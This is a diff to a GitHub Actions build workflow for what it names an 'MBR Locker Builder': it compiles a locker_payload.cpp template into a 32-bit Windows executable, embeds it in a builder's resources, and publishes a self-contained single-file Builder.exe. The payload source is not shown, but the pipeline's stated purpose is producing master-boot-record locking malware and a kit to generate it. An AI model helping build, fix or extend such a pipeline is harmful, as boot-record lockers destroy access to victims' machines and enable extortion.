@@ -1,4 +1,4 @@
-name: Build Universal MBR Locker Builder
+name: Build MBR Locker Builder
 
 on:
   push:
@@ -13,10 +13,12 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v4
 
-    - name: Install MinGW (GCC for Windows)
+    - name: Install MinGW (with both 32-bit and 64-bit)
       run: |
         choco install mingw -y
+        choco install mingw-w64 -y
         echo "C:\tools\mingw64\bin" | Out-File -FilePath $env:GITHUB_PATH -Encoding utf8 -Append
+        echo "C:\tools\mingw32\bin" | Out-File -FilePath $env:GITHUB_PATH -Encoding utf8 -Append
 
     - name: Download NASM
       shell: cmd
@@ -45,16 +47,16 @@ jobs:
       with:
         dotnet-version: 6.0.x
 
-    - name: Compile Template (Universal 32-bit)
+    - name: Compile Template (32-bit with MinGW)
       shell: cmd
       run: |
-        set PATH=C:\tools\mingw64\bin;%PATH%
+        set PATH=C:\tools\mingw64\bin;C:\tools\mingw32\bin;%PATH%
         cd template
-        i686-w64-mingw32-g++ -static -O2 -mwindows locker_payload.cpp -o locker_payload.exe -luser32 -lkernel32 -ladvapi32 -lshlwapi -lntdll
+        g++ -m32 -static -O2 -mwindows locker_payload.cpp -o locker_payload.exe -luser32 -lkernel32 -ladvapi32 -lshlwapi -lntdll
         if exist locker_payload.exe (
           mkdir ..\builder\Resources 2>nul
           copy locker_payload.exe ..\builder\Resources\template.exe
-          echo [SUCCESS] Template compiled (32-bit, universal)
+          echo [SUCCESS] Template compiled (32-bit)
         ) else (
           echo [ERROR] Compilation failed!
           exit /b 1
@@ -67,12 +69,12 @@ jobs:
         dir builder\Resources
         echo ================================
 
-    - name: Build Universal Builder (AnyCPU + Self-Contained)
+    - name: Build Autonomous Builder (Self-Contained + Single File)
       shell: cmd
       run: |
         cd builder
         dotnet restore
-        dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -p:Platform=AnyCPU -o ../output
+        dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -o ../output
         if exist ..\output\Builder.exe (
           echo [SUCCESS] Builder built successfully
         ) else (
